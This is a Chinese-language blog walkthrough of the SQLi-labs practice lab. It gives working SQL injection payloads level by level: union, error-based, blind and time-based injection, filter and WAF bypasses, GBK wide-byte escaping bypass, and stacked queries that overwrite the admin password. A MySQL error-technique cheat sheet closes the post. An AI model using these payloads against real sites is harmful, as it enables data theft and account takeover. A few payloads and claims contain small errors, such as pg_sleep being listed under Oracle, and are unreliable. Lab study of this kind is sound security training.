---
title: SQLi-lab 练习解答
categories: Technology
tags:
	- sql injection
---

# SQLi-lab 练习解答

Tags: 漏洞分析与总结

## Less-1 
通过
```
id=1'
id="
```
可以看到错误信息的是第二条，所以可以得出id的数据类型是字符型，并且用单引号括起来，像这样
```
select user, passwd from table id='$id'
```
从错误信息
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```
可以知道，一次只返回一行数据，但是返回的列数我们暂时还不知道，通过union测试
```
union 1 --+ 
union 1,2 --+
union 1,2,3 --+
```
> 这里还有一种确定字段数的方法
```
id=1 order by 1
id=1 order by 2
id=1 order by n
```

通过一系列的测试可以知道，在本次sql查询中，每次返回一行三列的数据，联想到union的查询知识
>* union 用于合并两个或多个 select 语句的结果集，并消去表中任何重复行。union 内部的 select 语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条 select 语句中的列的顺序必须相同。
>* union 默认会去掉重复记录值再合并成结果集，如果需要保留重复的记录值，请使用 union all。
>* union 结果集中的列名总是等于 union 中第一个 select 语句中的列名

上面没有提到，但是可以想到，我们可以将union所连接的前面的查询的数据为空，将union后面的查询数据显现出来
```
null union select 我们想要的结果
```
比如这一题我们可以这么做，通过测试可以知道id>100的话，肯定是没有数据的
```
id=100' union select 1,2,3 --+
```
可以看到结果是
```
Welcome    Dhakkan
Your Login name:2
Your Password:3
```
进一步我们可以这么做了
```
id=100' union select 1, version(), database() --+
id=100' union select 1,(select table_name from information_schema.tables limit 3,1),database() --+
```


## Less-2
由'和"的错误信息可以知道，id的数据类型为整形
其他的测试过程同Less-1


## Less-3
由错误信息可知，id的数据类型为字符型，单引号，并且用)包裹了起来
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
```
所以poc
```
id=100') union select 1, version(), database() --+
```


## Less-4
与上一题相比只是将单引号变为了双引号
poc
```
1000") union select 1,version(), database() --+
```


## Less-5
测试不同状态页面的反应可知，在查询到结果时的
```
Welcome    Dhakkan
You are in...........
```
查询不到结果时
```
Welcome    Dhakkan
```
在出错时，正常显示出错信息，那么上面使用的方法在这里不再适用，因为不会再把union查询出的数据显示出来，所以我们需要使用mysql特有的报错来写poc

利用下文中的延伸拓展的mysql的经典报错方式
使用第一种进行注入测试
```
id=1' union select 1, (select count(*), concat(floor(rand(0)*2), 0x5e5e, database())x from information_schema.tables group by x), 3 --+
```
出错信息如下
```
Operand should contain 1 column(s)
```
可以看出列数太多，变换一下
```
id=1' union select 1, (select 1 from(select count(*), concat(floor(rand(0)*2), 0x5e5e, database())x from information_schema.tables group by x)y), 3 --+
```
可以看出成功爆出数据库名


## Less-6
将Less-5单引号变为双引号即可通过


## Less-7
经过测试id为字符型，单引号包裹
括号测试：
```
id=1')
id=1'))
id=1')))
```
确定使用的是双括号
结合延伸拓展中的注入文件信息，给出poc
```poc
id=1')) union select 1,2,3 into dumpfile 'result.txt'
```
exp的利用方式，可以将shell写入文件中，之后访问！


## Less-8
id为单引号，字符型数据
通过测试知道这是一道布尔型注入题
poc
```
id=1' (select ascii(substr(database(),1,1)))>100 --+ ==> success
id=1' (select ascii(substr(database(),1,1)))>110 --+ ==> success
id=1' (select ascii(substr(database(),1,1)))>120 --+ ==> fail
id=1' (select ascii(substr(database(),1,1)))=115 --+ ==> success
...
```
可写自动化脚本进行测试，并用二分法提高测试成功的效率。


## Less-9

无论怎么更改注入语句，页面都不会发生改变，利用基于时间的注入进行测试

> 基于时间的注入方式
```SQL
sql server: waitfor delay '0:0:9' --
mysql: sleep(9) --
mysql: benchmark(exe_times, exe) ==> benchmark(100000,md5(1)) --
oracle: pg_sleep(9) --
```

poc
```SQL
id=1' and sleep(3) --+
id=1' and select if((select database()='security'), sleep(10), NULL)) --
id=1' and select if(substr(database(),1,1)='s',sleep(10),NULL) --
id=1' and (select if(ascii(substr((select table_name from information_schema.tables
where table_schema=database() limit 0,1),1,1))=111,sleep(10),NULL))--+
```
可以使用time + curl(测试参数需要进行URL编码)命令做简单测试
```shell
time curl -o /dev/null -s http://192.168.1.107/sqli-labs/Less-9/?id=1%27%20union%20select%201,2,sleep%286%29%20--+
```
结果
```
real	0m6.009s
user	0m0.004s
sys	    0m0.000s
```


## Less-10
在Less-9的基础上换成双引号
```
id=1" and sleep(10) --
```

## Less-11
最基础的登录注入，有一点需要注意，--后面有一个空格
poc
```
username: admin' and '1'='1' --
username: ' or '1'='1' limit 1,1 -- 
```
这里使用上面的`--+`不成功，使用`--空格`成功了，不知道具体的原因，有待后续查验

[Overview](#overview)


## Less-12
将Less-11中的单引号变为双引号，并添加一层括号
poc
```
username: ") or "1"="1" limit 0,1 --  
```
[test](#user-content-Less-7)
## Less-13
poc
```
username:') or "1"="1" limit 0,1 -- 
```


## Less-14
poc
```
username: " or "1"="1" limit 0,1 -- 
```

## Less-15
不会显示任何错误，布尔型注入
poc
```
username: ' or '1'='1' limit 1,1 -- 
```


## Less-16
不会显示任何错误，基于时间型注入
poc
```
username: ") or sleep(2) -- test
username: ") or "1"="1" -- test
```


## Less-17
这一道题开始根本不会做，没有任何想法，通过查看源码才发现
> 只有在username有效的情况下，password处才可以进行报错注入

poc
```
username: admin
New Password: ' and extractvalue(1, concat(0x5e5e, version())) -- 
```

## Less-18
因为显示了ip地址，所以用X-Forwarded-For进行测试，但是没有任何影响，放弃！
尝试利用账户admin:admin成功登录显示
![login](http://o7ocntpuu.bkt.clouddn.com/less_18_login_success.png)
几乎可以确定注入点在user-agent
利用`test' -- test`进行测试，得到了如下错误
![error](http://o7ocntpuu.bkt.clouddn.com/less_18_login_test_fail.png)
从出错信息可以猜到，应该是insert注入，因为提示出了很多列的数据，除了插入操作以外，我想不到别的会提示出这么多的错误

> 延伸拓展中详细介绍了mysql利用insert,update,delete进行数据注入的方法

所以根据延伸拓展的知识
poc
```
User-Agent: test' or extractvalue(1, concat(0x5e5e, version())) or ' -- test
```
![poc](http://o7ocntpuu.bkt.clouddn.com/less_18_user_agent_poc.png)

## Less-19
将user-agent换为referer
poc
```
Referer: test' or extractvalue(1, concat(0x5e5e, version())) or ' -- test
```
![poc](http://o7ocntpuu.bkt.clouddn.com/less_19_referer_poc.png)

## Less-20
基于cookie的注入
不会


## Less-21
基于cookie的注入
不会


## Less-22
基于cookie的注入
不会


## Less-23
单引号、字符型，所有注释符号无法使用
poc
```
id=100' union select '1','2','3
id=100' union select '1', extractvalue(1, concat(0x5e5e, version())), '3
```

## Less-24
这道题，整整做了接近两天的时间，而且还是在**审计源码**的情况下才过了的(自身太菜)。
各种排错，各种环境的搭建！下面详细解答一下这道题！
完全正确的设置应该是这样的
![env](http://o7ocntpuu.bkt.clouddn.com/less_24_env.png)
最主要的几个就是涉及到gbk编码的，别的就不用管了。
为了配置方便，反复实验，建议使用mysql的官方[docker镜像](https://hub.docker.com/_/mysql/)。
我环境配了很长时间，深知其中的痛苦，并且尽力不要在自己的本机做，环境配置起来比较繁琐，恢复还比较。我一开始以为我本机无法应用是因为我的mysql版本(5.5)太高，gbk编码的问题已经不能用了，所以我用的是这个[docker镜像](https://hub.docker.com/r/mtirsel/mysql-5.1/)，版本5.1，源自官方镜像，可以放心使用。
mysql的相关字符集的问题，可以看这篇文章，[MySQL的字符集](http://www.cnblogs.com/jevo/p/3274726.html)，基本上本实验用到的知识，这里都囊括了。

这里介绍一下最简单的配置方式，一条命令就可以完美的搭建好我们的配置环境，
在Less-24/login.php中添加代码如下
![code](http://o7ocntpuu.bkt.clouddn.com/less_24_add_code.png)

至此我们实验所需要的环境已经搭建完成，我们开始sql注入。
通过查看源码，我们主要的关注点在这里
```php
$username = mysql_real_escape_string($_POST["login_user"]);
$password = mysql_real_escape_string($_POST["login_password"]);
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```
`login_user`和`login_password`都经过`mysql_real_escape_string`函数进行转义的，其转义的字符包括：
```
\x00    '   "   \r  \n  \x1a    \
```
这个函数能够执行的前提是，已经连接了数据库，实验时请注意。
```php
$con = mysql_connect("your_host", "root", "your_password");
if (!$con) {
    die('could not connect:' . mysql_error());
}
mysql_select_db("security", $con);
$user = 'something';
$user_trans = mysql_real_escape_string($user);
echo $user_trans;
```

这道题我们需要做的就是绕过经过`mysql_real_escape_string`转义，并被单引号包裹的sql查询语句。以我的能力，我能想到的只有是编码的问题了，即宽字节注入
举例
```
$trans_before = "%bf'";
$trans_after = mysql_real_escape_string($trans_before);
```

此时$trans_after值为`%bf\'`，其中`\`的编码为`%5c`，根据gbk的编码范围可知，`%bf%5c`表示的是字`縗`的编码，所以成功吃了字符`%5c`，并多出一个`%27`，即一个单引号

GBK编码范围

| 第一字节(高字节) | 第二字节(低字节) |
| ---------------- | ---------------  |
| 0x81~0xFE        | 0x40~0x7E/0x80~0xFE(转义符5c在其中)|

经过上面的讨论，可得
poc
![poc](http://o7ocntpuu.bkt.clouddn.com/less_24_poc.png)


## Less-25
过滤了`or`和`and`，但是`union select`, `order by`都没有过滤
poc
```
id=400' union select 1,extractvalue(1, concat(0x5e5e, database())),3 --+
```


## Less-26
    各种尝试后，可以得出，为防止注入过滤了如下字符
```
and, or, #, /**/, --, --+, 空格, ||, &&, +
```
空格的绕过方法主要有两个

* 利用注释符   如 `union/**/select/**/1,/**/2`
* 利用括号 如`select(1)from(table_name)where(id=..)`

所以可能的poc
```
?id=100'union(select(1),2,3)'
```
但是这样由于在union select后多了一个''，所以导致出错，即id是由单引号包裹的，想要绕过单引号的限制，我们可以使用注释符，将后面的语句注释掉

常用的注释符
```
//, -- , /**/, #, --+, -- -, ;%00
```
只有最后一个没有过滤，尝试使用，得到出错的poc
```
?id=100'union(select((extractvalue(1,concat(0x5e5e,version()))),(2),(3)));%00
```

在解决这道题时遇到了一个我以前没有发现的问题，在获取$_GET['id']的变量时，竟然自动进行url解码
举例
```
// $_GET['id'] = '%23test'
$id=$_GET['id'];
// $id='#test'
```


## Less-27
过滤了union,select等，直接多重绕过
poc
```
100'ununionion(seselselectectlect(1),2,3);%00
```


## Less-28
过滤的字符
```
空格, #, --, union select /**/ 
```
这题一开始我也想像上题那样利用;%00绕过的，后来才发现不行，但是这个恰恰给了我一种完全不同的思路，以前的思路是先用union select，之后尽力绕过后面的单引号。在这道题想了各种方式绕过后面的单引号，但都以失败告终。
现在的思路是不绕过后面的单引号，我们好好利用它，并放弃使用union select模式。

poc
```
id=1'and(if(substr(database(),1,1)='s',1,0))and'1'='1
```
过了这题之后，查看源码才发现
```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```
很多时候，后面的是无法注释掉的，一定要好好利用才行，完全转换自己的思路，还是自己太菜了。


## Less-29
index.php的poc
```
id=1'and(if(substr(database(),1,1)='s',1,0))and'1'='1
```

login.php要是开waf，做不出来




## Less-30

和上两题相比，就是单引号变双引号的区别(index.php)
poc
```
id=1"and(if(substr(database(),1,1)="s",1,0))and"1"="1
```

login.php要是开waf，做不出来


## Less-31

poc
```
id=1"and(if(substr(database(),1,1)="s",1,0))and"1"="1
```

login.php要是开waf，做不出来



## Less-32
和Less-24基本是一样的思路，这里不再赘述
poc
```
id=%df%27union(select(1),2,3)--+
```


## Less-33
貌似和Less-32一模一样
poc同Less-32


## Less-34
没有什么别的介绍的，和上面的题基本一样，直接给poc
![poc](http://o7ocntpuu.bkt.clouddn.com/less_34_poc.png)


## Less-35
id没有单引号包裹

poc
```
id=1 or if(ascii(substr(database(),1,1))=0x73,1,0) -- 
```


## Less-36
绕过`mysql_real_escape_string`函数

poc
```
id=%df%27union(select(1),2,3)--+
```


## Less-37
直接给poc
![poc](http://o7ocntpuu.bkt.clouddn.com/less_37_poc.png)


## Less-38
这是一道Stacked queries SQL injection(可多语句查询注入)的题，原本没遇到这种题，查看了一下源码，才知道多语句查询是这么回事
```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    /* execute multi query */
    if (mysqli_multi_query($con1, $sql))
    {
        /* store first result set */
        if ($result = mysqli_store_result($con1))
        {
            if($row = mysqli_fetch_row($result))
            {
                //something
            }
        }
        /* print divider */
        if (mysqli_more_results($con1))
        {
            //something
        }
        //while (mysqli_next_result($con1));
    }
    else
    {
        print_r(mysqli_error($con1));
    }
    /* close connection */
    mysqli_close($con1);
```

poc(更改admin的密码)
```
id=1' union select 1,2,3; update users set password='test' where username='admin' --+
```
之后用admin账户与密码登录尝试！登录成功，则说明注入成功


## Less-39
id换成整数
```
id=1 union select 1,2,3; update users set password='testt' where username='admin' --+
```


## Less-40


多了一个括号
poc
```
id=100') union select 1,2,3;update users set password='daitao' where username='admin' --+
```

## Less-41
id换成整数

poc
```
id=100 union select 1,2,3; update users set password='testtu' where username='admin' --+
```


## Less-42



## Less-43
## Less-44
## Less-45
## Less-46
## Less-47
## Less-48
## Less-49
## Less-50










# 延伸拓展
## mysql 经典报错方式
第一种：
```
select count(*), floor(rand(0)*2)x from information_schema.tables group by x
```
变形：
```
select count(*), concat(floor(rand(0)*2), 0x5e5e, version())x from information_schema.tables group by x
(select 1 from(select count(*), concat(floor(rand(0)*2), 0x5e5e, version())x from information_schema.tables group by x)y)
```

第二种：
```
extractvalue(1, concat(0x7e,version()))
```

第三种：
```
updatexml(1, concat(0x5e, version()), 1)
```

第四种：
```
SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a
出错信息：
Duplicate column name '5.5.49-0ubuntu0.14.04.1'
```

* name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。



## mysql将结果注入文件中的方法
> 导入多行
```
select * from users into outfile 'file.txt'
```

>导入单行
```
select * from users limit 0,1 into dumpfile 'file.txt'
select * from users limit 0,1 into outfile 'file.txt'
```


## 利用insert，update和delete注入获取数据
payload
```
or updatexml(1,concat(0x7e,(version())),0) or
```
利用
```
INSERT INTO users (id, username, password) VALUES (2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or'', 'Nervo');

UPDATE users SET password='Nicky' or updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia';

DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';
```

我们可以用insert、update、delete语句获取到数据库表名、列名，但是不能用update获取当前表的数据
别的表可以查出结果
```
mysql> update users set password='test' or updatexml(1,concat(0x5e5e, (select table_name from information_schema.tables limit 0,1)),1) where id=2;

ERROR 1105 (HY000): XPATH syntax error: '^^CHARACTER_SETS'
```
查users当前表
```
mysql> update users set password='test' or updatexml(1, concat(0x5ete, (select username from security.users limit 0,1)),1) where id=1;

ERROR 1093 (HY000): You can't specify target table 'users' for update in FROM clause
```

相对应的变形
```
' or (payload) or '
' and (payload) and '
' or (payload) and '
' or (payload) and '='
'* (payload) *'
' or (payload) and '
" – (payload) – "
```



# References
[virusdefender's blog](https://virusdefender.net/index.php/category/sqli/)
[利用insert，update和delete注入获取数据](http://drops.wooyun.org/tips/2078)
[MySQL注射的过滤绕过技巧2](http://www.lijiejie.com/mysql-injection-bypass-waf-2/)
[见招拆招：绕过WAF继续SQL注入常用方法](http://www.freebuf.com/articles/web/36683.html)
